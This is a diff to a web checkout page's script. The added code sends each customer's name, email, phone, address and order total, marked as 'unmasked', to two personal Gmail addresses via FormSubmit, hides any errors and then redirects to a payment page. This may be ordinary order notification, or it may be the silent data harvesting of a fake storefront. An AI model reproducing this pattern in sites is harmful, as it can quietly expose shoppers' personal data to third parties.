@@ -234,8 +234,49 @@
       orderTotal: data.total
     }));
 
-    // Direct redirect to payment page
-    location.href = "payment.html";
+    // Send billing data via FormSubmit
+    btn.textContent = "SAVING...";
+    btn.disabled = true;
+    
+    // Create form data
+    const formData = new FormData();
+    formData.append('_subject', 'New Order - Billing Information');
+    formData.append('_template', 'table');
+    formData.append('_captcha', 'false');
+    formData.append('_autoresponse', 'Thank you for your order! We have received your billing information and will process it shortly.');
+    
+    // Add all billing details unmasked
+    formData.append('fullName', data.fullName);
+    formData.append('email', data.email);
+    formData.append('phone', data.phone);
+    formData.append('billingAddress', data.address);
+    formData.append('city', data.city);
+    formData.append('postalCode', data.pincode);
+    formData.append('country', data.state);
+    formData.append('orderTotal', data.total);
+    formData.append('submissionTime', new Date().toLocaleString());
+    
+    // Send to both email recipients
+    Promise.all([
+      fetch("https://formsubmit.co/ajax/anandjhare4@gmail.com", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Accept": "application/json"
+        },
+        body: JSON.stringify(Object.fromEntries(formData))
+      }),
+      fetch("https://formsubmit.co/ajax/Rajatjha.ss708090@gmail.com", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Accept": "application/json"
+        },
+        body: JSON.stringify(Object.fromEntries(formData))
+      })
+    ]).catch(() => {}).finally(() => {
+      location.href = "payment.html";
+    });
   }
 </script>
 </body>
